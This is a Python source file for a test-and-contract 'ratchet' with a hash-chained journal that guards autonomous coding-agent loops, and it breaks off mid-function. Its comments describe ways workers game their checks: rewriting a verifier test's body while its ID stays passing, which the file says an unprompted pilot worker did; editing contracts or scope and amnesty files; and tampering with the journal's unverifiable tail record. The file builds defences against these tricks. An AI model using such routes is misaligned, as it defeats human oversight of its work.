#!/usr/bin/env python3
"""Quality ratchet + tamper-evident journal for target repos.

The ratchet is the deterministic safety mechanism that makes autonomous
fix-forward loops (/implement, /implement-wave) survivable: the set of test
cases that have ever passed on the default branch — the **high-water mark** —
may never shrink, and a contract may not "pass" merely because its definition
was weakened.

Three ratcheted quantities, all project-agnostic:

- **Test pass-set** — each configured suite (go test, pytest, jest, ...) emits
  per-case pass/fail via a pluggable parser; the union of passing case IDs from
  every *merged* record forms the high-water pass-set. A high-water case that
  now fails is a regression and blocks the merge.
- **Contract definition hashes** — every stable-ID'd block (``CTR-``/``INV-``/
  ``BR-``, see docs/traceability.md) in the epic docs is hashed. A high-water
  contract whose hash changed was *weakened* (or silently rewritten); one that
  disappeared was *removed*. Both block, unless a human deliberately journals
  an ``--amend``/``--retire``.
- **Verifier-test body hashes (report-only, #206)** — the pass-set is keyed by
  test ID, so a test's BODY can be rewritten to bless new behavior while its
  node ID stays green (goalpost channel C1c — demonstrated scripted AND by an
  unprompted pilot worker; docs/paper/experiment/). Tests annotated
  ``@cw-trace verifies <ID>`` are the executable expression of a contract, so
  their function bodies are hashed and ratcheted like contract definitions
  (``--amend-verifier``/``--retire-verifier`` to revise; amending a contract
  re-baselines its verifier tests). NEW dimension, so per docs/gate-rollout.md
  it is REPORT-ONLY until validated: ``check`` prints weakened/removed
  verifier tests but blocks only under ``--gate-verifier-tests``.
- **Protected pathset** — contracts, invariants, integration-test specs, formal
  models, and the ratchet's own state are the goalposts. ``protected`` flags a
  branch diff that touches them so the orchestrator parks the change for human
  review instead of merging: workers must not move their own goalposts.
- **Complexity & churn (report-only)** — mean cyclomatic complexity, %CCN>10,
  and relative churn (churned-LOC/total-LOC) are snapshotted alongside the
  scorecard. Their high-water mark is the LOWEST (best) value ever merged — the
  ratchet drives them DOWN — and a value that rises beyond a tolerance band is a
  regression. This dimension is NEW, so per docs/gate-rollout.md it is
  REPORT-ONLY: ``check`` prints the deltas but only blocks on them when the
  caller passes ``--gate-quality``. Missing lizard degrades to a skipped snapshot
  and never crashes ``score``.

Tamper-evidence: the journal is an append-only HASH CHAIN. The high-water mark
is DERIVED from the verified chain, not read from a separately-editable file —
so lowering the bar by editing state is detectable and fails closed. Boundary
(#209): the chain detects INTERIOR rewrites; the TAIL record has no next link,
so a tail tamper with a recomputed hash verifies — that blind spot is covered
by the layers outside the chain (``protected`` parks any worker branch touching
docs/quality/**, and git history anchors the default branch). See
docs/ratchet.md "Trust boundary".

State lives in the target repo (committed, like all epic artifacts):

    docs/quality/
    ├── ratchet.json            # config: suites, epic docs, protected paths
    ├── ratchet-journal.jsonl   # append-only hash chain (never hand-edit)
    ├── ratchet-highwater.json  # derived cache, for display only
    └── ratchet-scorecard.json  # latest `score` snapshot

Subcommands:
    init        write a starter config (autodetects go/pytest suites)
    score       run the suites + hash contract defs, snapshot the scorecard
    check       exit 1 if the ratchet is violated (regression/weakening/removal)
    regressed   print JSON of current violations vs the high-water mark
    record      append a hash-chained record; (re)derive the high-water cache
                (event=gate-validation records a gate-validation-protocol run —
                see docs/gate-validation.md — --ref names the gate)
    recent      print the last N records' notes (amnesia context for the fixer)
    highwater   print the derived high-water mark
    protected   exit 1 if a branch diff touches the protected pathset
    pathset     exit 1 if a branch diff ESCAPES a sanctioned pathset (#213):
                the inverse of `protected`, parameterized by pathset source —
                an explicit {"paths": [globs]} file (ticket-scoped, #216) or a
                domain scope.json ({"include"/"exclude"}); --report-only prints
                but exits 0

Exit codes: 0 = ok, 1 = gate violation, 2 = usage/config error,
3 = no scorecard (run `score` first), 4 = journal tamper detected.
"""

from __future__ import annotations

import argparse
import json
import re
import shlex
import subprocess
import sys
import xml.etree.ElementTree as ET
from collections.abc import Iterable
from dataclasses import dataclass, field
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

import artifacts  # noqa: E402 — meta-location resolver (chief-wiggum#213)

# Same stable-ID grammar as check_traceability.py and the TIM schema — shared
# via chief_wiggum.trace_ids so a kind added in one place cannot be silently
# dropped by another (#166; uppercase-id vacuity was the same class of bug,
# chief-wiggum#86). Re-exported here (identity, not a copy) so
# tests/test_trace_ids.py can keep cross-checking that ratchet, check_traceability,
# and the TIM schema all agree on the same regex objects.
# stable_hash/hash_epic_definitions's home is chief_wiggum.hashing (#160, #169) —
# check_single_writer.py and check_traceability.py import the same functions
# for --scanner-version and per-link suspect-propagation hashing, so there is
# exactly one contract-block hashing implementation, not a copy per module.
# _hash_markdown_defs/_walk_json_ids are kept as thin aliases to that shared
# home for callers/tests that reach into ratchet's (formerly private) internals.
from chief_wiggum.hashing import hash_epic_definitions, scanner_version, stable_hash  # noqa: E402
from chief_wiggum.hashing import hash_markdown_defs as _hash_markdown_defs  # noqa: E402,F401
from chief_wiggum.hashing import walk_json_ids as _walk_json_ids  # noqa: E402,F401
from chief_wiggum.trace_ids import ID_RE, canonical_id  # noqa: E402,F401
from chief_wiggum.trace_ids import MD_DEFINE_RE as DEFINE_RE  # noqa: E402,F401
from chief_wiggum.trace_links import SIDECAR_RELPATH, find_suspect_links, load_sidecar  # noqa: E402
from chief_wiggum.verifier_hashes import scan_verifier_hashes  # noqa: E402

CONFIG_NAME = "ratchet.json"
JOURNAL_NAME = "ratchet-journal.jsonl"
HIGHWATER_NAME = "ratchet-highwater.json"
SCORECARD_NAME = "ratchet-scorecard.json"
DEFAULT_STATE_DIR = "docs/quality"


def default_state_dir(repo: Path) -> Path:
    """The default ratchet state dir for a target: ``quality/`` under the
    target's meta root (chief-wiggum#213 resolver). Byte-identical to
    ``<repo>/docs/quality`` in embedded mode (no election); the sidecar
    quality dir when the target elected sidecar — where workers in the target
    worktree physically cannot write it."""
    return artifacts.Resolver.resolve(repo).quality_dir()

# A gate-authority lifecycle event (chief-wiggum#198): the operator wiring a gate
# with --gate (blocking) or un-wiring it. Journaled here — in the SAME
# hash-chained, tamper-evident ledger the ratchet already owns — rather than in a
# loose, forgeable JSON file, so "was this gate blocking?" is a tamper-evident
# fact and not a hand-writable one (`check_gate_validation.py --wire/--unwire`).
# It is NOT `merged`, so it never enters `derive_highwater`'s pass-set/contract
# high-water; it rides the chain purely for its own tamper-evidence.
GATE_AUTHORITY = "gate-authority"

# Complexity/churn ratchet tolerance (see docs/ratchet.md "Complexity & churn").
# DIRECTION: unlike the pass-set (which may not SHRINK), complexity is a cost we
# ratchet DOWNWARD — the high-water mark is the LOWEST (best) value ever merged,
# and a metric that RISES beyond the band below is a regression. The band absorbs
# ordinary noise: a metric regresses only if it exceeds
#   best * (1 + rel) + abs_epsilon.
DEFAULT_QUALITY_TOLERANCE = {
    "ccn_mean_rel": 0.10,        # mean CCN may drift up ≤ 10%
    "ccn_mean_abs": 0.5,         # ...plus an absolute epsilon (small repos)
    "pct_ccn_gt10_rel": 0.10,    # %CCN>10 may drift up ≤ 10% (relative)
    "pct_ccn_gt10_abs": 1.0,     # ...plus 1 absolute percentage point
    "relative_churn_rel": 0.25,  # relative churn is advisory — a wide band
    "relative_churn_abs": 0.05,
}

DEFAULT_PROTECTED = [
    "docs/epics/*/contracts.md",
    "docs/epics/*/invariants.md",
    "docs/epics/*/integration-tests.md",
    "docs/epics/*/state-machines.md",
    "docs/epics/*/models/**",
    "docs/quality/**",
    # The domain scope is a goalpost too (#213): widening scope.json widens
    # what a worker's diff may touch — a worker must not edit its own leash.
    "docs/scope.json",
    # Adoption artifacts are goalposts (#215): adoption.json is the brownfield
    # SWITCH (it flips repo-wide scope discipline), and grandfathered.json is
    # the amnesty file — a worker editing either could re-classify the repo or
    # grandfather its own new findings. Embedded-mode location; a sidecar
    # election keeps them outside the tree (unwritable by workers) entirely.
    "docs/adoption/*.json",
]


class RatchetError(Exception):
    """Config/usage problem. Maps to exit 2."""


class TamperError(Exception):
    """Journal hash chain broken. Maps to exit 4 — fail closed."""


# ---- config ------------------------------------------------------------------


@dataclass
class Suite:
    name: str
    cmd: str
    parser: str  # go-test-json | junit-xml | trx | pass-fail-lines
    cwd: str = "."
    # junit-xml: the file the cmd writes, repo-relative.
    # trx: the results DIRECTORY the cmd writes (`dotnet test` emits one
    # uniquely-named .trx per test project); a single file also works.
    report: str | None = None


@dataclass
class Config:
    repo: Path
    state_dir: Path
    suites: list[Suite] = field(default_factory=list)
    epic_docs: str = "docs/epics"
    protected_paths: list[str] = field(default_factory=lambda: list(DEFAULT_PROTECTED))
    quality_tolerance: dict = field(
        default_factory=lambda: dict(DEFAULT_QUALITY_TOLERANCE)
    )

    @property
    def journal(self) -> Path:
        return self.state_dir / JOURNAL_NAME

    @property
    def scorecard(self) -> Path:
        return self.state_dir / SCORECARD_NAME

    @property
    def highwater(self) -> Path:
        return self.state_dir / HIGHWATER_NAME


def repo_root(repo_arg: str | None) -> Path:
    if repo_arg:
        return Path(repo_arg).resolve()
    proc = subprocess.run(
        ["git", "rev-parse", "--show-toplevel"], capture_output=True, text=True
    )
    if proc.returncode != 0:
        raise RatchetError("not inside a git repo — pass --repo")
    return Path(proc.stdout.strip())


def load_config(repo: Path) -> Config:
    path = default_state_dir(repo) / CONFIG_NAME
    if not path.is_file():
        raise RatchetError(
            f"no ratchet config at {path} — run `ratchet.py init --repo {repo}` first"
        )
    raw = json.loads(path.read_text())
    suites = [Suite(**s) for s in raw.get("suites", [])]
    tol = dict(DEFAULT_QUALITY_TOLERANCE)
    tol.update(raw.get("quality_tolerance", {}) or {})
    return Config(
        repo=repo,
        state_dir=path.parent,
        suites=suites,
        epic_docs=raw.get("epic_docs", "docs/epics"),
        protected_paths=raw.get("protected_paths", list(DEFAULT_PROTECTED)),
        quality_tolerance=tol,
    )


# ---- contract definition hashes (weakening detection) --------------------------


def load_contract_hashes(cfg: Config) -> dict[str, str]:
    """Map stable ID -> definition hash across all epic docs (md + model JSON).

    Delegates to ``chief_wiggum.hashing.hash_epic_definitions`` (#169) — the
    single implementation of contract-block hashing, also reused by
    ``check_traceability.py`` for per-link suspect propagation.

    ``epic_docs`` may be ABSOLUTE (sidecar mode, where the epic artifacts live
    outside the target — ``cmd_init`` writes the resolver's absolute epics dir
    there): ``Path.__truediv__`` with an absolute right-hand side yields the
    right-hand side, so the join below is correct in both modes.
    """
    return hash_epic_definitions(cfg.repo / cfg.epic_docs)


# ---- suite parsers (pluggable, per target repo) --------------------------------


def parse_go_test_json(stdout: str) -> set[str]:
    passed, failed = set(), set()
    for line in stdout.splitlines():
        line = line.strip()
        if not line.startswith("{"):
            continue
        try:
            ev = json.loads(line)
        except json.JSONDecodeError:
            continue
        test = ev.get("Test")
        if not test:
            continue
        cid = f"{ev.get('Package', '')}::{test}"
        if ev.get("Action") == "pass":
            passed.add(cid)
        elif ev.get("Action") == "fail":
            failed.add(cid)
    return passed - failed


def parse_junit_xml(xml_text: str) -> set[str]:
    root = ET.fromstring(xml_text)
    passed = set()
    for case in root.iter("testcase"):
        outcomes = {c.tag for c in case}
        if outcomes & {"failure", "error", "skipped"}:
            continue
        cls = case.get("classname") or case.get("file") or ""
        passed.add(f"{cls}::{case.get('name', '')}")
    return passed


# TRX (Visual Studio Test Results) — what `dotnet test --logger trx` writes.
# One namespace, and only "Passed" counts: NotExecuted is a skip, and
# Failed/Error/Timeout/Aborted/Inconclusive are all not-passing (#259).
TRX_NS = "{http://microsoft.com/schemas/VisualStudio/TeamTest/2010}"


def _trx_case_id(test_name: str, class_name: str | None) -> str:
    """``ClassName::LocalName`` — the same ``class::name`` shape junit-xml
    produces. TRX's ``testName`` is fully qualified and carries the theory's
    data (``...ParameterisedPasses(n: 2)``), which is kept: each data case is
    its own ratcheted case."""
    if class_name and test_name.startswith(class_name + "."):
        return f"{class_name}::{test_name[len(class_name) + 1:]}"
    if class_name:
        return f"{class_name}::{test_name}"
    return test_name


def _trx_class_by_test_id(root: ET.Element) -> dict[str, str]:
    """``testId -> className`` from ``<TestDefinitions>``."""
    out: dict[str, str] = {}
    for unit in root.iter(f"{TRX_NS}UnitTest"):
        tid = unit.get("id")
        method = unit.find(f"{TRX_NS}TestMethod")
        if tid and method is not None and method.get("className"):
            out[tid] = method.get("className", "")
    return out


def parse_trx(xml_texts: Iterable[str]) -> set[str]:
    """Passing case IDs across one or more TRX documents.

    Takes an ITERABLE because `dotnet test` on a solution writes one TRX per
    test project (uniquely named, e.g. ``_host_2026-08-03_10_23_17_net10.0``
    and ``...[1]``) — parsing a single file would silently drop every other
    project's cases, which is the shape of under-measurement #259 is about.
    """
    passed: set[str] = set()
    other: set[str] = set()
    for xml_text in xml_texts:
        root = ET.fromstring(xml_text)
        classes = _trx_class_by_test_id(root)
        for result in root.iter(f"{TRX_NS}UnitTestResult"):
            name = result.get("testName")
            if not name:
                continue
            cid = _trx_case_id(name, classes.get(result.get("testId") or ""))
            (passed if result.get("outcome") == "Passed" else other).add(cid)
    return passed - other


def trx_case_files(cfg: Config, suite: Suite, xml_texts: Iterable[str]) -> dict[str, str]:
    """Map TRX case IDs to repo-relative source files (#207).

    TRX records the test DLL, never the source file, so the only available
    link is the class name. A class is resolved ONLY when exactly one tracked
    ``<ClassName>.cs`` exists under the suite cwd — an ambiguous or missing
    match stays unresolved (counted by ``score``), never guessed.
    """
    base = (cfg.repo / suite.cwd).resolve()
    by_stem: dict[str, list[Path]] = {}
    for path in base.rglob("*.cs"):
        if any(part in {"bin", "obj", ".git", "node_modules"} for part in path.parts):
            continue
        by_stem.setdefault(path.stem, []).append(path)

    out: dict[str, str] = {}
    for xml_text in xml_texts:
        root = ET.fromstring(xml_text)
        classes = _trx_class_by_test_id(root)
        for result in root.iter(f"{TRX_NS}UnitTestResult"):
            name = result.get("testName")
            if not name:
                continue
            cls = classes.get(result.get("testId") or "")
            if not cls:
                continue
            candidates = by_stem.get(cls.rsplit(".", 1)[-1], [])
            if len(candidates) != 1:
                continue  # ambiguous or absent — unresolved, never guessed
            try:
                # Keyed WITH the suite prefix, like junit_case_files /
                # go_case_dirs — run_suite filters this map against the
                # already-namespaced case IDs.
                out[f"{suite.name}::{_trx_case_id(name, cls)}"] = (
                    candidates[0].resolve().relative_to(cfg.repo.resolve()).as_posix()
                )
            except ValueError:  # outside the repo — leave unresolved
                pass
    return out


def _trx_documents(report: Path) -> list[str]:
    """TRX document texts for a suite's ``report`` path — every ``*.trx`` when
    it names a directory (the normal `dotnet test` case: one file per test
    project), or the single file when it names one."""
    if report.is_dir():
        return [p.read_text() for p in sorted(report.rglob("*.trx"))]
    return [report.read_text()] if report.is_file() else []


def parse_pass_fail_lines(stdout: str) -> set[str]:
    passed, failed = set(), set()
    for line in stdout.splitlines():
        m = re.match(r"^\s*(PASS|FAIL)[:\s]+(\S+)", line)
        if not m:
            continue
        (passed if m.group(1) == "PASS" else failed).add(m.group(2))
    return passed - failed


def junit_case_files(cfg: Config, suite: Suite, xml_text: str) -> dict[str, str]:
    """Map junit case IDs to repo-relative source files (#207).

    Prefers the testcase ``file`` attribute (xunit1); falls back to resolving
    the dotted ``classname`` against the suite's cwd (``tests.test_widget`` ->
    ``tests/test_widget.py``, trying with the trailing class segment dropped).
    Cases that resolve to no existing file are simply absent from the map —
    ``score`` counts them in ``test_files_unresolved``.
    """
    root = ET.fromstring(xml_text)
    out: dict[str, str] = {}
    base = (cfg.repo / suite.cwd).resolve()
    for case in root.iter("testcase"):
        cls = case.get("classname") or case.get("file") or ""
        cid = f"{suite.name}::{cls}::{case.get('name', '')}"
        fattr = case.get("file")
        candidates = [base / fattr] if fattr else []
        if cls:
            parts = cls.split(".")
            candidates.append(base.joinpath(*parts).with_suffix(".py"))
            if len(parts) > 1:  # trailing segment may be a test class
                candidates.append(base.joinpath(*parts[:-1]).with_suffix(".py"))
        for cand in candidates:
            if cand.is_file():
                try:
                    out[cid] = cand.resolve().relative_to(cfg.repo.resolve()).as_posix()
                except ValueError:  # outside the repo — leave unresolved
                    pass
                break
    return out


def go_case_dirs(cfg: Config, suite: Suite, stdout: str) -> dict[str, str]:
    """Map go-test-json case IDs to repo-relative package DIRECTORIES (#207).

    Go's import path prefixes the module name, which the parser doesn't know;
    progressively shorter suffixes of the package path are tried as
    directories under the suite cwd, then the repo root. Unmatched packages
    stay unresolved (counted by ``score``), never guessed.
    """
    out: dict[str, str] = {}
    pkg_dirs: dict[str, str | None] = {}
    for line in stdout.splitlines():
        line = line.strip()
        if not line.startswith("{"):
            continue
        try:
            ev = json.loads(line)
        except json.JSONDecodeError:
            continue
        test, pkg = ev.get("Test"), ev.get("Package", "")
        if not test or not pkg:
            continue
        if pkg not in pkg_dirs:
            pkg_dirs[pkg] = None
            parts = pkg.split("/")
            for i in range(len(parts)):
                rel = "/".join(parts[i:])
                for root in (cfg.repo / suite.cwd, cfg.repo):
                    if (root / rel).is_dir():
                        pkg_dirs[pkg] = (
                            (root / rel).resolve().relative_to(cfg.repo.resolve()).as_posix()
                        )
                        break
                if pkg_dirs[pkg]:
                    break
        if pkg_dirs[pkg]:
            out[f"{suite.name}::{pkg}::{test}"] = pkg_dirs[pkg]
    return out


def run_suite(cfg: Config, suite: Suite) -> tuple[set[str], dict[str, str]]:
    """Run one suite; return (passing case IDs, case-ID -> source file/dir map),
    both namespaced by suite name.

    A non-zero exit is expected when tests fail — the parsed per-case results
    are the signal, not the exit code. The file map (#207) feeds `protected`'s
    report-only high-water-test-file cue; unresolvable cases are absent here
    and surfaced by ``score`` as ``test_files_unresolved``.
    """
    if suite.parser == "trx" and suite.report:
        # A TRX results DIRECTORY accumulates: `dotnet test` adds a new
        # timestamped file per run per project, so a stale file from an
        # earlier run would keep a since-deleted test in the pass-set. Clear
        # first — the pass-set must describe THIS run.
        stale = cfg.repo / suite.report
        if stale.is_dir():
            for old in stale.rglob("*.trx"):
                old.unlink()

    proc = subprocess.run(
        suite.cmd, shell=True, cwd=cfg.repo / suite.cwd, capture_output=True, text=True
    )
    files: dict[str, str] = {}
    if suite.parser == "go-test-json":
        passed = parse_go_test_json(proc.stdout)
        files = go_case_dirs(cfg, suite, proc.stdout)
    elif suite.parser == "junit-xml":
        if not suite.report:
            raise RatchetError(f"suite {suite.name!r}: junit-xml parser needs `report`")
        report = cfg.repo / suite.report
        if not report.is_file():
            raise RatchetError(
                f"suite {suite.name!r}: report {report} not written by cmd:\n"
                f"{proc.stderr[-2000:]}"
            )
        passed = parse_junit_xml(report.read_text())
        files = junit_case_files(cfg, suite, report.read_text())
    elif suite.parser == "trx":
        if not suite.report:
            raise RatchetError(f"suite {suite.name!r}: trx parser needs `report`")
        report = cfg.repo / suite.report
        docs = _trx_documents(report)
        if not docs:
            raise RatchetError(
                f"suite {suite.name!r}: no .trx written to {report} by cmd "
                "(a test project without a trx logger reports NOTHING, which "
                f"would look like a clean empty pass-set):\n{proc.stderr[-2000:]}"
            )
        passed = parse_trx(docs)
        files = trx_case_files(cfg, suite, docs)
    elif suite.parser == "pass-fail-lines":
        passed = parse_pass_fail_lines(proc.stdout)
    else:
        raise RatchetError(f"suite {suite.name!r}: unknown parser {suite.parser!r}")
    if not passed and proc.returncode != 0:
        sys.stderr.write(
            f"ratchet: suite {suite.name!r} produced no passing cases "
            f"(exit {proc.returncode}):\n{proc.stderr[-2000:]}\n"
        )
    ids = {f"{suite.name}::{cid}" for cid in passed}
    return ids, {cid: f for cid, f in files.items() if cid in ids}


# ---- complexity + churn snapshot (report-only dimension) -----------------------
#
# DIRECTION NOTE: complexity is a cost the ratchet drives DOWN. The high-water
# mark for these fields is the LOWEST (best) value ever merged; a value that
# RISES beyond the tolerance band is a regression. This is the OPPOSITE of the
# pass-set, whose high-water mark is the LARGEST set and which regresses when it
# SHRINKS. See docs/ratchet.md.


def score_quality(cfg: Config, venv: str | None = None, gobin: str | None = None) -> dict:
    """Snapshot mean CCN, %CCN>10, and relative churn for the target repo.

    Optional and fast-failing: the ``quality`` engines live on the code-metrics
    branch and lean on lizard. If they are unavailable (import error, or lizard
    absent) this returns ``{"skipped": ...}`` and NEVER raises — ``score`` must
    stay usable on repos without the metric toolchain installed.
    """
    try:
        from quality import churn as _churn  # noqa: PLC0415
        from quality import complexity as _complexity  # noqa: PLC0415
    except Exception as e:  # pragma: no cover - import guard
        return {"skipped": f"quality engines unavailable: {e}"}

    repo = str(cfg.repo)

    # #213 domain scope: quality baselines are computed over the IN-SCOPE
    # population only. No scope file (the whole-repo default) means no filter
    # at all — byte-identical to the pre-scope behavior. A malformed scope file
    # skips the snapshot (fail-safe): it must never silently widen to whole-repo.
    try:
        scope = artifacts.load_scope_file(
            artifacts.Resolver.resolve(cfg.repo).scope_path()
        )
    except ValueError as e:
        return {"skipped": f"malformed scope file: {e}"}
    path_filter = None if scope is None else (
        lambda rel: artifacts.path_in_scope(scope, rel)
    )

    comp = _complexity.analyze(repo, venv=venv, gobin=gobin, path_filter=path_filter)
    if "skipped" in comp:
        return {"skipped": comp["skipped"], "note": comp.get("note")}

    # Aggregate the per-language cyclomatic distributions into a single
    # function-count-weighted mean CCN and %CCN>10 across all source functions.
    total_fns = 0
    ccn_sum = 0.0
    ccn_gt10 = 0.0
    for lang in (comp.get("languages") or {}).values():
        cyc = lang.get("cyclomatic_src")
        if not cyc:
            continue
        n = cyc.get("functions", 0)
        if not n:
            continue
        total_fns += n
        ccn_sum += cyc.get("ccn_mean", 0) * n
        ccn_gt10 += cyc.get("pct_ccn_gt10", 0) / 100.0 * n

    total_loc = (comp.get("src_loc_total", 0) or 0) + (comp.get("test_loc_total", 0) or 0)

    # Relative churn = churned LOC (adds+deletes) / total tracked LOC. Nagappan &
    # Ball (2005): absolute churn is a poor signal; always normalise by size.
    ch = _churn.analyze(repo, no_merges=True, path_filter=path_filter)
    churned = 0
    if "error" not in ch:
        c = ch.get("churn", {}) or {}
        churned = (c.get("added", 0) or 0) + (c.get("deleted", 0) or 0)

    out: dict = {
        "functions": total_fns,
        "total_loc": total_loc,
        "ccn_mean": round(ccn_sum / total_fns, 2) if total_fns else None,
        "pct_ccn_gt10": round(100 * ccn_gt10 / total_fns, 1) if total_fns else None,
        "relative_churn": round(churned / total_loc, 3) if total_loc else None,
        "churned_loc": churned,
    }
    return out


# The complexity/churn fields ratcheted DOWN. Keys map to the tolerance-band
# knobs ``<key>_rel`` / ``<key>_abs`` on ``quality_tolerance``.
QUALITY_METRICS = ("ccn_mean", "pct_ccn_gt10", "relative_churn")


def derive_quality_highwater(records: list[dict]) -> dict:
    """Best-seen (LOWEST) complexity/churn per metric across MERGED records.

    Backward-compatible: records predating this dimension carry no ``quality``
    block (or a ``skipped`` one); they contribute nothing and never crash.
    """
    best: dict = {}
    for rec in records:
        if not rec.get("merged"):
            continue
        q = (rec.get("scorecard", {}) or {}).get("quality") or {}
        if not isinstance(q, dict) or "skipped" in q:
            continue
        for m in QUALITY_METRICS:
            v = q.get(m)
            if isinstance(v, (int, float)):
                cur = best.get(m)
                if cur is None or v < cur:
                    best[m] = v
    return best


def quality_regressions(quality: dict, hw: dict, tolerance: dict) -> list[dict]:
    """Metrics that rose above ``best * (1 + rel) + abs`` — report-only findings.

    ``quality`` is the current scorecard's block; ``hw`` the derived best-seen
    high-water. Returns one entry per regressed metric (empty when none, or when
    there is no baseline / the current snapshot was skipped)."""
    if not isinstance(quality, dict) or "skipped" in quality:
        return []
    out: list[dict] = []
    for m in QUALITY_METRICS:
        best = hw.get(m)
        cur = quality.get(m)
        if not isinstance(best, (int, float)) or not isinstance(cur, (int, float)):
            continue
        rel = tolerance.get(f"{m}_rel", 0.0)
        eps = tolerance.get(f"{m}_abs", 0.0)
        limit = best * (1 + rel) + eps
        if cur > limit:
            out.append({
                "metric": m, "current": cur, "best": best,
                "limit": round(limit, 3), "delta": round(cur - best, 3),
            })
    return out


# ---- hash-chained journal ------------------------------------------------------


def load_journal(cfg: Config) -> list[dict]:
    """Read the journal and verify the hash chain. Fail closed on tamper."""
    if not cfg.journal.is_file():
        return []
    records = []
    for line in cfg.journal.read_text().splitlines():
        line = line.strip()
        if line:
            records.append(json.loads(line))
    prev = "genesis"
    for i, rec in enumerate(records):
        body = {k: v for k, v in rec.items() if k != "record_hash"}
        expect = stable_hash(prev, json.dumps(body, sort_keys=True))
        if rec.get("record_hash") != expect:
            raise TamperError(
                f"journal tamper detected at record {i} "
                f"({rec.get('record_id', '?')}): chain broken — fail closed"
            )
        prev = expect
    return records


# --- gate-authority journal primitives (chief-wiggum#198) ---------------------
# Path-based so `check_gate_validation.py` can journal/read wire events with only
# the journal path (it has no ratchet Config), while the chain format stays owned
# here in ratchet.py — the journal's single writer of record.


def _read_journal_path(journal_path: str | Path) -> list[dict]:
    p = Path(journal_path)
    if not p.is_file():
        return []
    return [json.loads(line) for line in p.read_text().splitlines() if line.strip()]


# The only valid gate-authority actions. A `details` value outside this set is
# NOT an authority action — it must never flip a wired gate to un-wired (finding
# 1): `last_authority_action` ignores it rather than treating it as an unwire.
_AUTHORITY_ACTIONS = ("wire", "unwire")


def verified_prefix(journal_path: str | Path) -> list[dict]:
    """The journal entries whose hash chain verifies from genesis, stopping
    BEFORE the first broken OR unparseable link. A TOLERANT read for facts that
    must survive a LATER tamper: "was this gate wired" is knowable from an
    early, still-valid entry even when a subsequent entry breaks the chain (a
    bad hash) OR is garbage that won't parse — the demotion path depends on that
    (a broken/garbled tail is itself a stale condition to demote ON, not one
    that should erase the knowledge the gate was blocking). Parsing is
    line-by-line so a non-JSON trailing line stops the prefix instead of
    crashing the whole read (finding 2)."""
    p = Path(journal_path)
    if not p.is_file():
        return []
    good: list[dict] = []
    prev = "genesis"
    for line in p.read_text().splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            rec = json.loads(line)
        except json.JSONDecodeError:
            break  # garbage tail — stop before it, keep the valid prefix
        if not isinstance(rec, dict):
            break
        body = {k: v for k, v in rec.items() if k != "record_hash"}
        if rec.get("record_hash") != stable_hash(prev, json.dumps(body, sort_keys=True)):
            break
        good.append(rec)
        prev = rec["record_hash"]
    return good


def last_authority_action(journal_path: str | Path, gate: str) -> str | None:
    """`'wire'` / `'unwire'` of the LAST gate-authority event for `gate` in the
    verified prefix, or None if the gate was never wired. This is the
    tamper-evident "is this gate currently under blocking authority" fact —
    read from journaled events, never from a hand-writable file.

    Only `wire`/`unwire` are authority actions: a hash-VALID gate-authority
    event carrying any OTHER `details` (e.g. a bogus `noop` slipped in after a
    real wire) is IGNORED, never treated as an un-wiring — it must never flip a
    wired gate to un-wired and suppress the demotion (finding 1)."""
    for rec in reversed(verified_prefix(journal_path)):
        if rec.get("event") == GATE_AUTHORITY and rec.get("ref") == gate:
            action = rec.get("details")
            if action in _AUTHORITY_ACTIONS:
                return action
            # else: not a real authority action — skip, keep looking for the
            # last genuine wire/unwire.
    return None


def append_authority_event(journal_path: str | Path, gate: str, action: str,
                           wired_rid: str | None = None) -> str:
    """Append a hash-chained gate-authority event (``wire``/``unwire``) for
    `gate`. Refuses to append onto a broken chain (fail closed — a tampered
    journal must not be silently extended). Returns the new ``rec-NNNNN`` id."""
    if action not in ("wire", "unwire"):
        raise RatchetError(f"gate-authority action must be wire|unwire, got {action!r}")
    # Robust broken/garbled-chain detection: compare the verified prefix against
    # the raw non-empty line count WITHOUT a full JSON parse (a garbage tail
    # must raise TamperError, not a JSONDecodeError — finding 3's append path).
    p = Path(journal_path)
    raw_lines = [ln for ln in p.read_text().splitlines() if ln.strip()] if p.is_file() else []
    verified = verified_prefix(journal_path)
    if len(verified) != len(raw_lines):
        raise TamperError(
            f"cannot append a gate-authority event: {journal_path} chain is broken — fail closed"
        )
    prev = verified[-1]["record_hash"] if verified else "genesis"
    body = {
        "record_id": f"rec-{len(verified) + 1:05d}",
        "event": GATE_AUTHORITY,
        "ref": gate,
        "details": action,
        "wired_rid": wired_rid,
        "merged": False,
    }
    body["record_hash"] = stable_hash(
        prev, json.dumps({k: v for k, v in body.items() if k != "record_hash"}, sort_keys=True)
    )
    path = Path(journal_path)
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("a") as f:
        f.write(json.dumps(body, sort_keys=True) + "\n")
    return body["record_id"]


def case_pattern(pattern: str) -> re.Pattern:
    """A retire-case pattern: ``*`` is the ONLY wildcard, everything else is
    literal.

    Deliberately not fnmatch/_glob_to_re. Case ids routinely contain ``[`` and
    ``]`` (pytest parametrisation — ``test_p[a]``), which both treat as a
    character class, so ``test_p[*]`` would silently mean "test_p followed by
    one of ``*``" instead of the whole parametrised family. Escaping everything
    but ``*`` keeps the one form an operator actually needs unambiguous."""
    return re.compile("".join(
        ".*" if ch == "*" else re.escape(ch) for ch in pattern) + r"\Z")


def retire_case_matches(pass_set: set[str], patterns: list[str]) -> set[str]:
    """Cases in ``pass_set`` matched by any retire-case pattern."""
    out: set[str] = set()
    for pat in patterns:
        rx = case_pattern(pat)
        out |= {cid for cid in pass_set if rx.match(cid)}
    return out


def derive_highwater(records: list[dict]) -> dict:
    """High-water = union of every case passing in a MERGED record, plus the
    definition hash each contract had when it first entered. Amendments and
    retirements are deliberate, journaled human acts that move the baseline.

    Contract-hash keys are canonicalized on read: journals written before
    ``hash_epic_definitions`` keyed by canonical form (PR #181 review) may
    carry raw-cased IDs (``CTR-BIL-001``), and without canonicalization here
    every such contract would falsely read as *removed* against a new
    canonical scorecard. The hash VALUES cover block content only, so they
    compare identically across the change."""
    pass_set: set[str] = set()
    contract_hashes: dict[str, str] = {}
    verifier_hashes: dict[str, str] = {}
    for rec in records:
        if rec.get("merged"):
            sc = rec.get("scorecard", {}) or {}
            pass_set.update(sc.get("pass_set", []) or [])
            for cid, h in (sc.get("contract_hashes", {}) or {}).items():
                contract_hashes.setdefault(canonical_id(cid), h)
            # Verifier-test hashes (#206): same first-entry-wins semantics.
            # Journals written before the dimension existed carry no field and
            # contribute nothing — tolerated unchanged, like `quality`.
            for ref, h in (sc.get("verifier_test_hashes", {}) or {}).items():
